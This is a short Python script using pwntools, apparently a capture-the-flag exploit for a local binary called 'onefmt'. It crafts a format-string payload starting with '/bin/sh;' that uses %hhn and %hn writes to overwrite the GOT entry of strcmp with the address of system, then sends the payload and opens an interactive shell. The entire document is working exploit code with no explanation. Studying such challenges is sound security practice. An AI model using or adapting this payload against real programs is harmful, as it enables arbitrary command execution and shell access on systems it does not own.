#!/usr/bin/python
# -*- coding: utf8 -*-

from __future__ import print_function
from pwn import *

context.log_level='debug'

elf = ELF('./onefmt')
io = process('./onefmt')

print(hex(elf.got['strcmp']))
print(hex(elf.sym['system']))

p1 = '/bin/sh;'
p2 = '%' + str(0x84 - len(p1)) + 'c%18$hhn'
p2 += '%' + str(0xa0 - 0x84) + 'c%19$hhn'
p2 += '%' + str(0x804 - 0xa0) + 'c%20$hn'
payload = p1 + p2
payload = payload.ljust(56, 'a')
payload += p32(elf.got['strcmp'] + 1)
payload += p32(elf.got['strcmp'])
payload += p32(elf.got['strcmp'] + 2)


io.readuntil(': ')
io.sendline(payload)
io.interactive()
